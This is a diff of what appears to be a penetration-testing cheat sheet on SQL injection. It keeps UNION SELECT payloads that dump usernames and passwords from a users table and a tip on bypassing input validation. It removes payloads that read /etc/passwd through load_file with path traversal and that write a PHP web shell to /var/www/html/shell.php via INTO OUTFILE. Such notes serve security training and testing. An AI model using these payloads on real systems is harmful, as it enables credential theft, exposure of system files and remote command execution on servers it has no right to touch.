@@ -74,13 +74,6 @@ We can use `ORDER BY` and `UNION SELECT` in a search field to visualize and enum
 # We now have all the information we need to query table data
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ' UNION SELECT null, username, password, description, null FROM users WHERE username='admin' -- //
-
-# LFI (also works in error payload)
-' UNION SELECT null, load_file('/etc/passwd'), null, null, null -- //
-' UNION SELECT null, load_file('../../../../../../etc/passwd'), null, null, null -- //
-
-# RCE (doesn't matter if PHP code is in viewable column)
-' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/shell.php" -- //
 ```
 
 **Note:** We can also add a `%` before the single quote to bypass input validation
